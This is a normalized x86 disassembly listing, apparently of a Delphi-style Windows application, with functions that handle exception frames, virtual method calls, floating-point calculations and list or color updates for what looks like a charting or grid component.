jmp r-xdata
push ebp
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_46bb28
pop ecx
push [ ebp - 0x18 ]
push r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xfc ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409820
push [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b9d0
jmp r-xdata
push ebp
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_46bb28
pop ecx
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b9d0
push [ ebp - 0x24 ]
mov eax [ ebp - 0x8 ]
mov edx 0x3
call sub_404268
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x50 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xea ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_465a80
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x7c ]
call sub_409820
jmp r-xdata
sub_46bde4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx 0x4
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xa4 ]
xor edx edx
mov eax [ esi + 0x64 ]
call sub_469240
mov [ esi + 0x38 ] 0x0
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov edx 0xc0c0c0
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x80 ]
sub_46be28
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
call sub_402918
xor eax eax
mov [ edi ] eax
mov [ edi + 0x4 ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x408f4000
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov eax [ ebx + 0x84 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
call sub_46e4e4
test eax eax
jle r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fstp [ ebp - 0x18 ]
fwait
call sub_409ce0
fstp [ ebp - 0x10 ]
fwait
fild [ ebp - 0x4 ]
fadd [ ebp - 0x10 ]
fsub [ r-xdata ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
mov edx [ ebx + 0x54 ]
mov eax [ ebx + 0x68 ]
call sub_46d7dc
fstp [ edi ]
fwait
mov edx [ ebx + 0x54 ]
mov eax [ ebx + 0x68 ]
call sub_46d7ac
fstp [ ebp - 0x20 ]
fwait
fld [ ebp - 0x20 ]
fcomp [ edi ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x20 ]
fsub [ edi ]
fstp [ esi ]
fwait
fld [ r-xdata ]
fcomp [ esi ]
fnstsw ax
sahf
jae r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
mov eax [ ebp + 0x14 ]
fdivr [ eax ]
mov eax [ ebp + 0x14 ]
fstp [ eax ]
fwait
fld [ ebp - 0x18 ]
fsub [ ebp - 0x10 ]
mov eax [ ebp + 0x14 ]
fstp [ eax ]
fwait
cmp [ ebp - 0x4 ] 0x1
jle r-xdata
mov edx [ ebx + 0x50 ]
mov eax [ ebx + 0x68 ]
call sub_46d7c4
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebx + 0x50 ]
mov eax [ ebx + 0x68 ]
call sub_46d794
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ ebp - 0x10 ]
fnstsw ax
sahf
jne r-xdata
fld [ ebp - 0x20 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ r-xdata ]
fcomp [ esi ]
fnstsw ax
sahf
jbe r-xdata
mov [ esi ] 0xffc00000
mov [ esi + 0x4 ] 0x41dfffff
jmp r-xdata
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
fld [ r-xdata ]
fmul [ edi ]
fstp [ ebp - 0x20 ]
fwait
xor eax eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x408f4000
jmp r-xdata
fld [ esi ]
call sub_402990
call sub_402bb8
mov [ ebp - 0x24 ] eax
fild [ ebp - 0x24 ]
fadd [ edi ]
mov eax [ ebp + 0x10 ]
fstp [ eax ]
fwait
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ esi ] 0xffc00000
mov [ esi + 0x4 ] 0xc1dfffff
fld [ r-xdata ]
fmul [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
fild [ ebp - 0x4 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
sub_46c006
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x34 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46c117
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jg r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax ebx
call sub_46be28
push 0x0
push 0x4
fld [ ebp - 0x30 ]
call sub_402990
call sub_404ce0
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x34 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_403924
test esi esi
jle r-xdata
mov [ eax + 0x28c ] 0x0
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_402bb8
mov [ ebp - 0x38 ] eax
fild [ ebp - 0x38 ]
fadd [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
sar eax 0x1
jns r-xdata
mov eax ebx
call sub_46b3c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c11e
lea eax [ ebp - 0x34 ]
call sub_403ee8
retn
mov [ eax + 0x28c ] 0x1
mov [ ebp - 0x3c ] eax
fild [ ebp - 0x3c ]
fsubp st1
fabs
fstp [ ebp - 0x20 ]
fwait
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov ecx 0x20000000
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x90 ]
fld [ ebp - 0x18 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
dec esi
jne r-xdata
adc eax 0x0
sub_46c128
push ebx
push esi
mov ebx edx
mov esi [ eax + 0x68 ]
mov edx ebx
mov eax esi
call sub_4611bc
mov edx ebx
xor dl 0x1
mov eax esi
call sub_46e324
pop esi
pop ebx
retn
sub_46c154
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_414098
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_46a774
inc esi
dec ebx
jne r-xdata
sub_46c194
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46c467
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414654
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_46aa08
mov eax [ ebp - 0x4 ]
call sub_46a554
test al al
je r-xdata
mov esi ebx
mov edx [ esi + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax ebx
call sub_46a554
test al al
je r-xdata
mov esi ebx
mov eax [ esi + 0xa4 ]
test eax eax
je r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov esi 0x2
mov esi ebx
mov edx [ esi + 0x84 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ esi + 0x8c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
mov eax esi
call sub_46a750
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp [ edx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0x80 ]
mov edx esi
call sub_469f9c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov edx esi
call sub_469f9c
pop edx
mov ecx [ eax ]
call [ ecx + 0x8 ]
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x58
mov esi ebx
mov edx [ esi + 0x58 ]
call sub_403f3c
mov eax [ ebp - 0x4 ]
add eax 0x40
mov edx [ esi + 0x40 ]
call sub_403f3c
mov eax [ esi + 0x80 ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x80 ]
mov eax [ eax + 0x8 ]
dec eax
call sub_46038c
sub eax 0x2
jl r-xdata
push ebp
mov eax [ esi + 0x48 ]
call sub_46c154
pop ecx
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x4 ]
call sub_469e74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c46e
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
mov esi ebx
mov edx [ esi + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ esi + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov al [ esi + 0x38 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] al
mov eax [ ebp - 0x4 ]
add eax 0x78
mov edx [ esi + 0x78 ]
call sub_403f3c
mov eax [ ebp - 0x4 ]
add eax 0x7c
mov edx [ esi + 0x7c ]
call sub_403f3c
mov eax [ ebp - 0x4 ]
add eax 0x6c
mov edx [ esi + 0x6c ]
call sub_403f3c
mov al [ esi + 0x30 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x30 ] al
mov al [ esi + 0x90 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x90 ] al
mov al [ esi + 0xa0 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa0 ] al
mov al [ esi + 0xa1 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa1 ] al
mov ax [ esi + 0x44 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x44 ] ax
mov al [ esi + 0x70 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x70 ] al
mov al [ esi + 0xa8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xa8 ] al
mov eax [ ebp - 0x4 ]
add eax 0xf0
mov edx [ esi + 0xf0 ]
call sub_403f3c
mov eax [ ebp - 0x4 ]
call sub_46a6d0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi + 0x3c ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46b3b8
jmp r-xdata
inc eax
mov [ ebp - 0x8 ] eax
xor esi esi
mov eax [ ebx + 0x3c ]
mov edx esi
call sub_414098
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
call sub_413eec
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x60 ]
mov ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_46b78c
inc esi
dec [ ebp - 0x8 ]
jne r-xdata
sub_46c478
push ebx
push esi
push edi
mov ebx eax
lea eax [ ebx + 0x38 ]
mov ecx edx
mov edx ebx
xchg edx eax
call sub_46b780
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_46b9bc
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov ecx 0x20000000
mov edx edi
mov eax ebx
call sub_46c5b0
inc edi
dec esi
jne r-xdata
sub_46c4fc
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
mov edi [ ebx + 0x88 ]
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax ebp
call sub_403ee8
jmp r-xdata
mov edx esi
mov eax edi
call sub_414098
test eax eax
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x88 ]
call sub_414098
mov edx ebp
call sub_4088b0
sub_46c540
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
cmp esi [ edi + 0x8 ]
jge r-xdata
mov eax [ ebx + 0x34 ]
mov edx esi
mov eax edi
call sub_414098
cmp eax 0x20000000
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x34 ]
jmp r-xdata
mov eax esi
call sub_460f1c
jmp r-xdata
sub_46c57c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x68 ] esi
mov eax ebx
call sub_46ab20
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
mov edx ebx
call sub_46e370
mov edx ebx
call sub_46e468
sub_46c5c4
push ebx
push esi
mov ebx edx
test ebx ebx
jne r-xdata
mov eax ebx
call sub_4041a8
inc eax
call sub_4026dc
mov esi eax
mov edx ebx
mov eax esi
call sub_40875c
xor esi esi
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
sub_46c5f0
push ebx
mov eax [ eax + 0x88 ]
call sub_414098
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
call sub_4086c4
mov edx eax
inc edx
mov eax ebx
call sub_4026fc
sub_46c618
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x80 ]
mov ebx [ ebp + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ edi + 0x3c ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ edi + 0x3c ]
mov edx [ rw-data ]
call sub_4141fc
mov eax [ edi + 0x88 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ edi + 0x88 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ edi + 0x88 ]
mov edx [ rw-data ]
call sub_4141fc
mov eax [ edi + 0x64 ]
call sub_469300
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax ebp
call sub_469f9c
mov edx [ eax ]
call [ edx + 0x14 ]
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax edi
call sub_46c5f0
inc esi
dec ebx
jne r-xdata
sub_46c6a0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
xor ecx ecx
xor edx edx
mov eax ebx
call sub_46cc98
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
pop ebx
retn
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax ebx
call sub_46ae80
sub_46c6ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x13c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
cmp [ esi + 0x8e ] 0x0
je r-xdata
cmp [ esi + 0x8e ] 0x0
jne r-xdata
cmp [ ebx + 0x90 ] 0x2
je r-xdata
cmp [ ebx + 0xa0 ] 0x2
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
cmp esi [ ebx + 0x50 ]
je r-xdata
cmp esi [ ebx + 0x54 ]
je r-xdata
sub_46c738
push ebx
push esi
push edi
mov edi ecx
mov esi [ eax + 0x68 ]
mov ebx [ esi + 0x288 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebx + 0x10 ]
call sub_41d610
cmp eax [ esi + 0x34c ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41d610
test eax eax
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41d734
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
xor edx edx
mov eax [ ebx + 0xc ]
call sub_41d310
mov edx 0xffffff
mov eax [ ebx + 0xc ]
call sub_41d310
sub_46c7a4
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] ecx
mov esi edx
mov ebx eax
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov edi [ eax + 0x10 ]
cmp esi 0xffffffff
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb8 ]
mov edx eax
mov eax edi
call sub_41d618
mov edx [ ebx + 0x34 ]
mov eax edi
call sub_41d618
jmp r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x34c ]
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0x0
lea eax [ esp + 0x8 ]
push eax
lea ecx [ esp + 0x8 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi + 0x130 ]
cmp [ esp + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d610
cmp eax 0x1fffffff
je r-xdata
mov edi [ ebx + 0x68 ]
mov eax [ esp + 0x4 ]
push eax
mov eax [ edi + 0x288 ]
mov eax [ eax + 0x10 ]
call sub_41d610
mov edx eax
mov cl [ esp + 0xc ]
mov eax edi
call sub_461354
mov ecx [ esp ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x12c ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x34c ]
mov [ esp + 0x4 ] eax
cmp [ esp + 0x4 ] 0x20000000
jne r-xdata
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x70 ]
mov [ esp + 0x4 ] eax
sub_46c8a4
push ebx
mov ebx eax
cmp [ ebx + 0x9c ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_46cf04
mov edx eax
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x33c ]
call sub_460384
mov edx [ ebx + 0x68 ]
mov [ edx + 0x33c ] eax
mov eax [ ebx + 0x68 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xf4 ] eax
pop ebx
retn
inc [ eax + 0x33c ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x33c ]
mov [ ebx + 0xf4 ] eax
jmp r-xdata
pop ebx
retn
sub_46c900
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebx + 0x50 ]
call sub_466bb0
pop esi
pop ebx
retn
sub_46c934
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x10 ]
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x0
test al 0x40
je r-xdata
cmp [ ebx + 0xda ] 0x0
je r-xdata
cmp [ ebx + 0xe2 ] 0x0
je r-xdata
mov eax [ ebx + 0x68 ]
mov al [ eax + 0x28d ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x1
mov dl [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
mov edx [ ebx + 0x68 ]
mov [ edx + 0x28d ] 0x1
mov dl [ ebp + 0x14 ]
push edx
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
jmp r-xdata
sub_46c9c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebx + 0x54 ]
call sub_466bf4
pop esi
pop ebx
retn
sub_46c9ec
push ebx
push esi
push edi
push ebp
push ecx
mov ebx edx
mov edi eax
mov eax [ edi + 0x80 ]
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ edi + 0x3c ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x88 ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
mov edx ebx
call sub_413f38
mov edx ebp
mov eax [ esp ]
call sub_469f9c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
inc ebp
dec esi
jne r-xdata
mov eax [ edi + 0x64 ]
mov eax [ eax + 0x24 ]
cmp ebx [ eax + 0x8 ]
jge r-xdata
mov edx ebx
mov eax edi
call sub_46c5f0
mov eax [ edi + 0x88 ]
mov edx ebx
call sub_413f38
mov ecx ebx
mov dl 0x2
mov eax edi
call sub_46cc98
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov edx ebx
call sub_413f38
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46ae80
sub_46ca84
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp ecx
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x80 ]
mov [ esp + 0x4 ] eax
mov eax [ esp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esp ]
mov eax [ eax + 0x3c ]
mov ecx ebp
mov edx edi
call sub_414028
mov eax [ esp ]
mov eax [ eax + 0x88 ]
mov ecx ebp
mov edx edi
call sub_414028
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ esp + 0x4 ]
call sub_469f9c
mov eax [ eax + 0x8 ]
mov ecx ebp
mov edx edi
call sub_414028
inc esi
dec ebx
jne r-xdata
sub_46cb7c
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_46cf04
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_46cba0
push ebx
add esp 0xfffffff4
mov ebx eax
mov eax ebx
call sub_46cf04
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
fstp [ esp ]
fwait
fld [ esp ]
add esp 0xc
pop ebx
retn
sub_46cbc4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46cc43
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_46b9bc
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46cc4a
lea eax [ ebp - 0xc ]
call sub_403ee8
retn
inc esi
mov [ ebp - 0x8 ] 0x0
lea ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_46bb74
mov edx [ ebp - 0xc ]
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x288 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_460384
mov [ ebp - 0x4 ] eax
inc [ ebp - 0x8 ]
dec esi
jne r-xdata
sub_46cc54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_4140f4
inc eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_413eec
sub_46cc98
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] dl
mov [ esp ] eax
mov eax [ esp ]
mov eax [ eax + 0x60 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
jmp [ edx * 4 + jump_table_46cce1 ]
mov eax [ esp ]
mov eax [ eax + 0x60 ]
mov edx esi
call sub_414098
xor edx edx
mov dl [ esp + 0x4 ]
cmp edx 0x4
ja r-xdata
test [ eax + 0xa1 ] 0x8
je r-xdata
test [ eax + 0xa1 ] 0x1
je r-xdata
test [ eax + 0xa1 ] 0x4
je r-xdata
test [ eax + 0xa1 ] 0x2
je r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x98 ]
jmp r-xdata
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
mov edi [ eax ]
call [ edi + 0x40 ]
jmp r-xdata
mov ecx [ esp + 0x8 ]
mov edx [ esp ]
mov edi [ eax ]
call [ edi + 0x34 ]
jmp r-xdata
sub_46cd78
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_46ce1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_419ea0
mov esi [ ebx + 0x74 ]
test esi esi
je r-xdata
mov eax ebx
call sub_46a6d0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ce22
lea eax [ ebp - 0x8 ]
call sub_403ee8
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebx + 0x74 ]
call sub_403198
mov eax [ ebx + 0x48 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
